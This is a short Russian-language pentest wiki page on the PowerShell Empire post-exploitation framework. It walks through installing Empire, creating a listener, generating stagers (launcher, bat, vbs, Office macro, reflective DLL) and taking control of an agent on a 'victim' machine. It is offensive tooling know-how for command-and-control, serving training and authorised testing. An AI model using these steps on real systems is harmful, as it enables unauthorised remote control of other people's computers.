# \[OLD] PowerShell Empire (PS/Python)

### Intro

Постэксплуатация в винде\
Офф: [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)\
Документация: [https://www.powershellempire.com/](https://www.powershellempire.com)

### Установка

git clone [https://github.com/EmpireProject/Empire.git](https://github.com/EmpireProject/Empire.git)\
Для установки зависимостей в систему: bash Empire/setup/[install.sh](http://install.sh)\
Далее запускаем скрипт для инициализации базы данных Empire/setup/setup\_database.py

### Запуск

`./empire` \
Основные понятия, с которыми нам придется столкнуться это `listener`, `stager` и `agent`.&#x20;

`Listener` – локальные IP адрес и порт, к которым должен подключаться агент при успешном выполнении на стороне жертвы.

Командой `listeners` переходим в режим конфигурирования листнера и создаем новый листнер по адресу 192.168.1.3:8080

```
Empire> listeners Empire (listeners)> set 
.. > set Host http://192.168.1.3:8080
.. > execute 
.. > list
```

`Stager` – способ доставки Powershell Empire агента на машине жертвы. По аналогии с фреймворком Metasploit, существует stage0 и stage1, где будем считать, что stage0 – способ доставки Empire агента, а stage1 – сам агент. На самом деле процесс доставки несколько сложнее, о чем можно подробно почитать на официальном сайте.

Командой usestager можно выбрать следующие варианты для stage0 (далее стейджер):&#x20;

```
.. > usestager 
.. > usestager launcher test 
Далее можно настроить некоторые параметры для стейджера: 
Empire (stager/launcher)> info 
Командой generate создается стейджер типа launcher. 
.. > generate
```

Есть и другие стейджеры, которые могут быть использованы в зависимости от ситуации. Перечислим основные из них.

```
launcher_bat – агент доставляется на машину жертвы при запуске bat-файла.
launcher_vbs – агент доставляется на машину жертвы при выполнении vbs-скрипта.
macro – будет сгенерирован код для макроса, который можно внедрить в документ MS Office.
dll – запуск powershell агента внутри процесса, отличного от powershell.exe при помощи техники Reflective DLL loading.
```

Запустим сгенерированный код нашего стейджера `launcher` на машине «жертве» На машине атакующего в интерфейсе Empire видим сообщение. Это означает, что между машиной атакующего и машиной жертвы теперь установлено соединение и агент готов получать команды.

Для удобства можно переименовать агента:&#x20;

```
.. > agents 
.. > rename ... windows7sp1
```

Далее, для перехода в режим взаимодействия, выполним команду interact и при помощи команды help увидим доступные опции:&#x20;

```
.. > interact windows7sp1 
.. > help
```

### Papers

[https://habr.com/ru/company/pentestit/blog/327490/](https://habr.com/ru/company/pentestit/blog/327490/)
